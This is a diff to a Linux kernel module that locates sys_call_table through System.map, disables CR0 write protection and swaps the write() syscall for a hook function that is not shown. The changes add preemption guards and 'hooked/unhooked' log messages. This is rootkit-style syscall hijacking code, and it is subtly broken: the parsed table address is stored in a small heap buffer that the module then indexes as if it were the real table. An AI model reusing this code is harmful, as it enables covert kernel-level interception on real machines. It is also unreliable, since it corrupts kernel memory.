@@ -4,9 +4,11 @@
 #include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
 #include <linux/fs.h>      /* filp_open */
 #include <linux/slab.h>    /* kmalloc */
+#include <linux/preempt.h> /* preempt_enable, preempt_disable */
 
 #include <asm/paravirt.h> /* write_cr0 */
 #include <asm/uaccess.h>  /* get_fs, set_fs */
+#include <asm/syscall.h>  /* sys_call_ptr_t */
 
 #include "hooks.h"
 
@@ -14,16 +16,9 @@
 #define BOOT_PATH "/boot/System.map-"
 #define MAX_VERSION_LEN   256
 
-
-
-
-
-
 unsigned long *syscall_table = NULL;
 //unsigned long *syscall_table = (unsigned long *)0xffffffff81801400;
 asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
-
-
 
 static int find_sys_call_table (char *kern_ver) {
     char system_map_entry[MAX_VERSION_LEN];
@@ -108,7 +103,8 @@ static int find_sys_call_table (char *kern_ver) {
                 strncpy(sys_string, strsep(&system_map_entry_ptr, " "), MAX_VERSION_LEN);
              
                 //syscall_table = (unsigned long long *) kstrtoll(sys_string, NULL, 16);
-                syscall_table = kmalloc(sizeof(unsigned long *), GFP_KERNEL);
+                //syscall_table = kmalloc(sizeof(unsigned long *), GFP_KERNEL);
+                syscall_table = kmalloc(sizeof(syscall_table), GFP_KERNEL);
                 kstrtoul(sys_string, 16, syscall_table);
                  
                 kfree(sys_string);
@@ -130,14 +126,6 @@ static int find_sys_call_table (char *kern_ver) {
  
     return 0;
 }
-
-
-
-
-
-
-
-
 
 char *acquire_kernel_version (void) {
   struct file *proc_version;
@@ -214,10 +202,13 @@ static int __init onload(void) {
   printk(KERN_EMERG "Syscall table address: %lx\n", *syscall_table);
 
   if (syscall_table != NULL) {
+    preempt_disable();
     write_cr0 (read_cr0 () & (~ 0x10000));
     original_write = (void *)syscall_table[__NR_write];
     syscall_table[__NR_write] = &new_write;
     write_cr0 (read_cr0 () | 0x10000);
+    preempt_enable();
+    printk(KERN_EMERG "[+] onload: sys_call_table hooked\n");
   } else {
     printk(KERN_EMERG "[-] onload: syscall_table is NULL\n");
   }
@@ -230,9 +221,12 @@ static int __init onload(void) {
 
 static void __exit onunload(void) {
   if (syscall_table != NULL) {
+    preempt_disable();
     write_cr0 (read_cr0 () & (~ 0x10000));
     syscall_table[__NR_write] = original_write;
     write_cr0 (read_cr0 () | 0x10000);
+    preempt_enable();
+    printk(KERN_EMERG "[+] onunload: sys_call_table unhooked\n");
   } else {
     printk(KERN_EMERG "[-] onunload: syscall_table is NULL\n");
   }
